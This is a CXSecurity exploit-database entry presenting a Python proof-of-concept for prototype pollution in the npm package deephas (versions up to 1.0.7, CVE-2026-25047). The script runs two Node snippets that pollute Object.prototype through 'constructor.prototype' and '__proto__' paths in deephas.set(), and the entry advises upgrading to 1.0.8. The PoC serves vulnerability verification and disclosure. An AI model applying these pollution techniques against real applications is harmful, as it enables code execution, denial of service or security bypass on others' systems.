---
title: deephas < = 1.0.7 - Prototype Pollution leading to Arbitrary Code Execution / DoS
url: https://cxsecurity.com/issue/WLB-2026020005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-02
fetch_date: 2026-02-03T04:08:52.026281
---

# deephas < = 1.0.7 - Prototype Pollution leading to Arbitrary Code Execution / DoS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **deephas <= 1.0.7 - Prototype Pollution leading to Arbitrary Code Execution / DoS** **2026.02.02**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

#!/usr/bin/env python3
#
# Exploit Title: deephas <= 1.0.7 - Prototype Pollution leading to Arbitrary Code Execution / DoS
# Google Dork: N/A
# Date: 2026-02-01
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Vendor Homepage: https://www.npmjs.com/package/deephas
# Software Link: https://github.com/sharpred/deepHas
# Version: <= 1.0.7 (fixed in 1.0.8 and later)
# Tested on: Node.js 16 / 18 / 20 (Linux / macOS / Windows)
# CVE : CVE-2026-25047
# GHSA: GHSA-2733-6c58-pf27
# CVSS: 9.8 (Critical)
#
# Description:
# The 'deephas' npm package suffers from a prototype pollution vulnerability
# in versions 1.0.7 and below due to unsafe recursive property assignment
# without proper hasOwnProperty checks and inadequate path sanitization.
#
# An attacker who can supply arbitrary keys to deephas.set() can pollute
# Object.prototype — which may lead to:
# • Remote code execution (when polluting sensible properties like
# process.env, require.extensions, child\_process, etc.)
# • Denial of Service
# • Security bypass (when polluting hasOwnProperty, toString, etc.)
# • Privilege escalation in sandboxed / vm2-like environments
#
# This PoC demonstrates pollution of Object.prototype via two techniques:
# 1. constructor.prototype path + hasOwnProperty bypass
# 2. \_\_proto\_\_ path + indexOf bypass
#
# References:
# • https://github.com/sharpred/deepHas/security/advisories/GHSA-2733-6c58-pf27
# • https://nvd.nist.gov/vuln/detail/CVE-2026-25047
#
# Usage:
# 1. npm install deephas@1.0.7
# 2. python3 poc-deephas-prototype-pollution.py
#
# Remediation:
# Upgrade to deephas >= 1.0.8
#
import subprocess
import os
import textwrap
import sys
import shutil
def run\_js(code: str) -> tuple[bool, str, str]:
"""Execute JavaScript code snippet via Node.js and capture output"""
tmp\_file = "poc-deephas-temp.js"
try:
with open(tmp\_file, "w", encoding="utf-8") as f:
f.write(code.strip())
result = subprocess.run(
["node", tmp\_file],
capture\_output=True,
text=True,
timeout=10,
check=False
)
return (
result.returncode == 0,
result.stdout.strip(),
result.stderr.strip()
)
except FileNotFoundError:
return False, "", "Node.js not found. Please install Node.js."
except subprocess.TimeoutExpired:
return False, "", "Execution timed out."
except Exception as e:
return False, "", f"Error: {str(e)}"
finally:
if os.path.exists(tmp\_file):
try:
os.remove(tmp\_file)
except:
pass
def show\_result(name: str, success: bool, stdout: str, stderr: str):
print(f"{'─' \* 10} {name} {'─' \* 10}")
if not success:
print("STATUS : FAILED")
if stderr:
print("ERROR :", stderr.splitlines()[0] if stderr.splitlines() else stderr)
else:
print("(no error message captured)")
else:
polluted = any(x in stdout.lower() for x in ["yes!!!", "hacked", "polluted"])
status = "VULNERABLE (pollution successful)" if polluted else "UNEXPECTED RESULT"
print(f"STATUS : {status}")
print()
for line in stdout.splitlines():
print(f" {line}")
print("─" \* 70)
print()
def main():
print("=" \* 70)
print(" deephas <= 1.0.7 – Prototype Pollution PoC")
print(" CVE-2026-25047 / GHSA-2733-6c58-pf27")
print("=" \* 70)
print()
if not shutil.which("node"):
print("Error: Node.js is required but not found in PATH.")
sys.exit(1)
print("[\*] Make sure you have installed the vulnerable version:")
print(" npm install deephas@1.0.7\n")
# ── PoC 1: constructor.prototype + hasOwnProperty bypass ───────
poc1 = textwrap.dedent("""\
Object.prototype.hasOwnProperty = () => true;
const has = require('deephas');
const obj = {};
has.set(obj, 'constructor.prototype.poc1', 'yes!!!');
console.log('obj.poc1 →', obj.poc1);
console.log('{}.poc1 →', {}.poc1);
console.log('polluted global? →', {}.poc1 === 'yes!!!');
""")
ok1, out1, err1 = run\_js(poc1)
show\_result("PoC 1 – constructor.prototype pollution", ok1, out1, err1)
# ── PoC 2: \_\_proto\_\_ + indexOf bypass ──────────────────────────
poc2 = textwrap.dedent("""\
String.prototype.indexOf = () => -1;
const has = require('deephas');
const obj = {};
has.set(obj, '\_\_proto\_\_.poc2', 'HACKED');
console.log('obj.poc2 →', obj.poc2);
console.log('{}.poc2 →', {}.poc2);
console.log('polluted global? →', {}.poc2 === 'HACKED');
""")
ok2, out2, err2 = run\_js(poc2)
show\_result("PoC 2 – \_\_proto\_\_ + indexOf bypass", ok2, out2, err2)
print(" " \* 20 + "SUMMARY".center(30, "─"))
print("If you see 'yes!!!' or 'HACKED' printed from {}.xxx property")
print("→ deephas@1.0.7 is VULNERABLE to prototype pollution.")
print()
print("Fix: Upgrade to deephas >= 1.0.8")
print("=" \* 70)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top